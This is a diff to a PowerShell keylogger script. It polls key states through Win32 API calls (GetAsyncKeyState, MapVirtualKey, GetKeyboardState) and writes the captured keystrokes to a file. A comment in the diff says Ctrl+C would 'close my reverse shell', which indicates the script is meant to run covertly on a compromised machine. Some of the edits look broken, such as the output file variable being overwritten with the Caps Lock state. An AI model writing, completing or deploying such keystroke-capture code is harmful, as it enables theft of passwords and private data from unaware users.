@@ -36,7 +36,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
         # create output file
-        New-Item -Path $path -ItemType File -Force
+        $file = New-Item -Path $path -ItemType File -Force
 
         Write-Host ""
         Write-Host "Starting keylogger..." -ForegroundColor Yellow
@@ -45,18 +45,23 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         while ($true) {
             Start-Sleep -Milliseconds 40
       
-            for ($ascii = 0; $ascii -le 254; $ascii++) {
+            # scan all ASCII codes above 8
+            for ($ascii = 9; $ascii -le 254; $ascii++) {
                 # get current key state
                 $state = $API::GetAsyncKeyState($ascii)
 
-                # check if ctrl + c pressed?
+                # is key pressed?
+                #will want another key instead of ctrl + c, because it will close my reverse shell
                 if ($state -eq -32767) {
+                    $file = [console]::CapsLock
+
                     # translate scan code to real code
                     $virtualKey = $API::MapVirtualKey($ascii, 3)
 
                     # get keyboard state for virtual keys
                     $kbstate = New-Object Byte[] 256
-                    
+                    $checkkbstate = $API::GetKeyboardState($kbstate)
+
                     # prepare a StringBuilder to receive input key
                     $mychar = New-Object -TypeName System.Text.StringBuilder
 
@@ -73,12 +78,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     }
 }
 
-function run($arg) {
+function run($arg){
     title
     If ($arg) {
         Start-KeyLogger($arg)
-    }
-    else { Write-Error "Please specify the file name..." }
+    }else { Write-Error "Please specify the file name..." }
 }
 
 run($args[0])
